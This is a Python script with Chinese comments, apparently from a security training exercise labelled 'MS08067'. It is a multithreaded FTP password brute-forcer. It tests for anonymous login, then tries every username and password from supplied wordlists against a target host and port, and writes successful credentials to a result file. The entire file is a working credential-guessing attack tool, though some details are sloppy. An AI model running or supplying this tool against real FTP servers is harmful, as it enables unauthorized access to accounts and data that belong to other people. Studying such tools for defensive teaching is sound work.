import ftplib
import optparse
import threading

#编写匿名用户登录检查函数，检查ftp是否允许匿名登录
def CheckAnonymous(FTPServer):
    try:
        #检查是否允许匿名用户登录
        print('checking user [anonymous] with password [anonymous]')
        f = ftplib.FTP(FTPServer)#实例化ftp连接，传入ftp地址
        f.connect(FTPServer,21,timeout=10)#发起连接，传入端口号，超时时间
        f.login()
        print('\n[+] Credentials have found successfully.')
        print("\n[+] Username : anonymous")
        print('\n[+] Password : anonumous')
        resultFile = open('result','a')
        resultFile.write('success!!!username:{},password:{}'.format("anonymous","anonymous"))
        resultFile.close()
        f.quit()#关闭连接
    except ftplib.all_errors:
        pass #ftplib中所有的错误，都进行忽略

#编写线程类，当线程找到正确的账户或密码时，将其写入文件并且退出程序
class ThreadWork(threading.Thread):
    def __init__(self,ip,usernameBlocak,passwordBlocak,port):
        threading.Thread.__init__(self)
        self.ip = ip
        self.port = int(port)
        self.usernameBlocak = usernameBlocak
        self.passwordBlocak = passwordBlocak

    def start(self):
        #从账户子块和密码错误，则会抛出异常
        for userItem in self.usernameBlocak:
            for pwdItem in self.passwordBlocak:
                self.run(userItem,pwdItem)

    def run(self,username,password):
        try:
            print('[-]checking user[' +username+'],password['+ password +']')
            f = ftplib.FTP(self.ip) 
            f.connect(self.ip,self.port,timeout=15)
            #如果账号密码错误，则会抛出异常
            f.login(username,password)
            f.quit()
            print("\n[+] Credentials have found successfully.")            
            print("\n[+] Username : {}".format(username))            
            print("\n[+] Password : {}".format(password))
            resultFile = open('result','a')
            resultFile.write('success!!! username :{}, password: {}'.format(username,password))
        except ftplib.error_perm:
            pass

# 编写列表分块函数
def partition(list,num):
    # step为每个子列表的长度
    step = int(len(list) / num)
    # 若子列表不够除以0，就把step设置为子线程数
    if step ==0:
        step = num
    partList = [list[i:i+step] for i in range(0,len(list),step)]
    return partList

# 编写破解函数，如下
def FTPExploit(ip,usernameFile,passwordFile,threadNumber,ftpPort):
    print("============破解信息============")    
    print("IP:" + ip)    
    print("UserName:" + usernameFile)    
    print("PassWord:" + passwordFile)    
    print("Threads:" + str(threadNumber))    
    print("Port:" + ftpPort)    
    print("=================================")

    # 先检查是否允许匿名用户登录
    CheckAnonymous(ip)

    # 读取账户文件和密码文件,并存入对应列表中
    listUsername = [line.strip() for line in open(usernameFile)]
    listPassname = [line.strip() for line in open(passwordFile)]

    #将账号列表和密码列表根据线程数量进行分块
    blockUsername = partition(listUsername,threadNumber)
    blockPassword = partition(listPassname,threadNumber) 

    threads = []
    #给线程分配工作
    for sonUserBlock in blockUsername:
        for sonPwdBlock in blockPassword:
            # 创建线程
            work = ThreadWork(ip,sonUserBlock,sonPwdBlock,ftpPort)
            workThread = threading.Thread(target=work.start)
            threads.append(workThread)
    # 运行子线程
    for t in threads:
        t.start()
    # 阻塞主线程，等待所有子线程完成工作
    for t in threads:
        t.join()


if __name__ == '__main__':
    print("\n#####################################")    
    print("#         => MS08067 <=             #")    
    print("#                                   #")    
    print("#          ftp experiment           #")    
    print("######################################\n")
    parser = optparse.OptionParser('Example: python %prog -i 127.0.0.1 -u ./username -p ./password -t 20 -P 21\n')
    
    # 添加FTP地址参数-i
    parser.add_option('-i','--ip',dest='targetIP',default='127.0.0.1',type='string',help='FTP Server IP')
    # 添加线程参数 -t
    parser.add_option('-t','--threads',dest='threadNum',default=10,type='int',help='Number of threads [default]')
    #添加用户名文件参数 -u
    parser.add_option('-u','--username',dest='userName',default='./username',type='string',help='username file')
    parser.add_option('-p', '--password', dest='passWord',default='./passwords', type='string',help='password file')     # 添加密码文件参数-p（小写）    
    parser.add_option('-P', '--port', dest='port',default='21', type='string',help='FTP port')       # 添加FTP端口参数-P（大写）    
    (options,args) = parser.parse_args()
    try:        
        FTPExploit(options.targetIP,options.userName,options.passWord,options.threadNum,options.port)    
    except:        
        exit(1)



